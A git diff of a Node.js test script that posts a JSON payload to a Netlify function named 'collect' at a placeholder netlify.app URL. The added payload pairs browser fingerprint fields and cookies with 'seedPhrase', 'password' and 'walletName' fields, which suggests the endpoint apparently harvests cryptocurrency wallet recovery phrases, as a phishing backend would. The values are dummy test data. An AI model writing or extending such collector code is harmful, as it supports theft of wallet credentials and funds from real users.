@@ -1,52 +1,74 @@
-const axios = require("axios");
+const https = require("https");
 
-async function testNetlifyDeployment() {
-  console.log("🌐 Testing Netlify Deployment...");
+// Replace with your actual Netlify URL
+const NETLIFY_URL = "https://your-netlify-app.netlify.app";
 
-  // Replace with your actual Netlify URL
-  const netlifyUrl = "https://your-site-name.netlify.app";
+async function testNetlifyFunction() {
+  const testData = {
+    timestamp: new Date().toISOString(),
+    ip: "127.0.0.1",
+    userAgent: "Test Agent",
+    platform: "Test Platform",
+    device: "Test Device",
+    language: "en-US",
+    screen: "1920x1080",
+    cookies: "test=true",
+    walletName: "Test Wallet",
+    seedPhrase: "test seed phrase",
+    password: "test password",
+  };
 
-  try {
-    // Test 1: Check if site is accessible
-    console.log("📡 Testing site accessibility...");
-    const siteResponse = await axios.get(netlifyUrl, { timeout: 10000 });
-    console.log("✅ Site is accessible");
-    console.log("📋 Status:", siteResponse.status);
+  const postData = JSON.stringify(testData);
 
-    // Test 2: Check if Netlify function is working
-    console.log("🔧 Testing Netlify function...");
-    const testData = {
-      timestamp: new Date().toISOString(),
-      test: true,
-      message: "Testing Netlify deployment",
-    };
+  const options = {
+    hostname: new URL(NETLIFY_URL).hostname,
+    port: 443,
+    path: "/.netlify/functions/collect",
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+      "Content-Length": Buffer.byteLength(postData),
+    },
+  };
 
-    const functionResponse = await axios.post(
-      `${netlifyUrl}/.netlify/functions/collect`,
-      testData,
-      {
-        headers: { "Content-Type": "application/json" },
-        timeout: 10000,
-      }
-    );
+  return new Promise((resolve, reject) => {
+    const req = https.request(options, (res) => {
+      let data = "";
 
-    console.log("✅ Netlify function is working");
-    console.log("📋 Response:", functionResponse.data);
-  } catch (error) {
-    console.error("❌ Error:", error.message);
+      res.on("data", (chunk) => {
+        data += chunk;
+      });
 
-    if (error.response) {
-      console.error("📋 Status:", error.response.status);
-      console.error("📋 Data:", error.response.data);
-    }
+      res.on("end", () => {
+        console.log("Status Code:", res.statusCode);
+        console.log("Response Headers:", res.headers);
+        console.log("Response Body:", data);
+        resolve({ statusCode: res.statusCode, data });
+      });
+    });
 
-    console.log("");
-    console.log("🔍 Troubleshooting steps:");
-    console.log("1. Check if your Netlify site is deployed");
-    console.log("2. Verify the URL is correct");
-    console.log("3. Check Netlify deployment logs");
-    console.log("4. Ensure environment variables are set");
-  }
+    req.on("error", (error) => {
+      console.error("Request Error:", error);
+      reject(error);
+    });
+
+    req.write(postData);
+    req.end();
+  });
 }
 
-testNetlifyDeployment();
+console.log("Testing Netlify function...");
+console.log("Make sure to update NETLIFY_URL with your actual Netlify URL");
+console.log("Current URL:", NETLIFY_URL);
+
+testNetlifyFunction()
+  .then((result) => {
+    if (result.statusCode === 200) {
+      console.log("✅ Netlify function is working!");
+    } else {
+      console.log("❌ Netlify function returned status:", result.statusCode);
+    }
+  })
+  .catch((error) => {
+    console.log("❌ Test failed:", error.message);
+  });
